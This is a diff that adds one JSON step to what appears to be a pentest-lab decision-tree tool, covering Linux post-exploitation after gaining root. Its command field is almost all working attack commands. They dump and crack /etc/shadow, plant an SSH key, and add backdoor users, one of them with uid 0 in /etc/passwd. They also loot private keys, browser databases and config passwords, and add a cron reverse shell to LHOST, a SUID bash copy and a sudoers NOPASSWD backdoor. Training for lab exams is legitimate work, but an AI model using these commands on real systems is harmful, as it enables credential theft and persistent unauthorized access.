@@ -1,0 +1,22 @@
+{
+  "id": "got_root_linux",
+  "phase": "LINUX",
+  "title": "ROOT — Linux Post-Exploitation",
+  "body": "You're root. Screenshot first, then dump everything before the session dies. Same cyclical rule — new box = check for pivots.",
+  "cmd": "# ── STEP 1: PROOF SCREENSHOT ─────────────────────────\nid && whoami && hostname\nip a\ncat /root/proof.txt\ncat /root/local.txt 2>/dev/null\n# Screenshot must show: uid=0(root) + hostname + IP + flag — all in one frame\n\n# ── STEP 2: DUMP /ETC/SHADOW ─────────────────────────\ncat /etc/shadow\ncat /etc/passwd\n\n# Unshadow and crack on Kali\n# cp both files to Kali then:\n# unshadow passwd shadow > unshadowed.txt\n# hashcat -m 1800 unshadowed.txt /usr/share/wordlists/rockyou.txt\n# john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt\n\n# ── STEP 3: PLANT SSH KEY (persistence) ───────────────\n# On Kali: ssh-keygen -t rsa -f /tmp/root_key\n# Copy public key to target:\nmkdir -p /root/.ssh\necho \"ssh-rsa AAAA...YOURPUBKEY...\" >> /root/.ssh/authorized_keys\nchmod 600 /root/.ssh/authorized_keys\n# Login: ssh -i /tmp/root_key root@$ip\n\n# ── STEP 4: ADD BACKDOOR USER ─────────────────────────\nuseradd -m -s /bin/bash backdoor\necho \"backdoor:pass123\" | chpasswd\nusermod -aG sudo backdoor\n# Or directly in passwd:\necho \"backdoor:$(openssl passwd w00t):0:0:root:/root:/bin/bash\" >> /etc/passwd\n\n# ── STEP 5: CHECK FOR PIVOTS ──────────────────────────\nip a\nip route\narp -a\ncat /etc/hosts\n# Two NICs = pivot opportunity -> go to pivot_start\n\n# ── STEP 6: LOOT ──────────────────────────────────────\n# SSH keys\nfind / -name \"id_rsa\" 2>/dev/null | xargs cat\nfind / -name \"*.pem\" -o -name \"*.key\" 2>/dev/null\ncat /root/.ssh/id_rsa 2>/dev/null\n\n# Browser/app creds\nfind / -name \"*.kdbx\" 2>/dev/null\nfind / -name \"*.db\" -path \"*/firefox/*\" 2>/dev/null\nfind / -name \"*.db\" -path \"*/chromium/*\" 2>/dev/null\n\n# History files\ncat /root/.bash_history\ncat /root/.mysql_history 2>/dev/null\n\n# Config files\nfind /etc -name \"*.conf\" | xargs grep -il \"password\" 2>/dev/null\ncat /etc/mysql/my.cnf 2>/dev/null\ncat /var/www/html/config.php 2>/dev/null\n\n# ── STEP 7: LINUX PERSISTENCE ─────────────────────────\n# Cron backdoor\n# echo \"* * * * * root bash -i >& /dev/tcp/LHOST/4444 0>&1\" >> /etc/crontab\n\n# SUID bash copy\ncp /bin/bash /tmp/.bash\nchmod +s /tmp/.bash\n/tmp/.bash -p   # regain root any time\n\n# Sudoers backdoor\necho \"www-data ALL=(ALL) NOPASSWD: ALL\" >> /etc/sudoers",
+  "warn": "Always screenshot BEFORE doing anything else — boxes get reverted. Plant the SSH key second so you can get back in if the shell dies.",
+  "choices": [
+    {
+      "label": "Second NIC found — pivot",
+      "next": "pivot_start"
+    },
+    {
+      "label": "Got hashes — crack them",
+      "next": "hashcrack"
+    },
+    {
+      "label": "Next machine",
+      "next": "start"
+    }
+  ]
+}
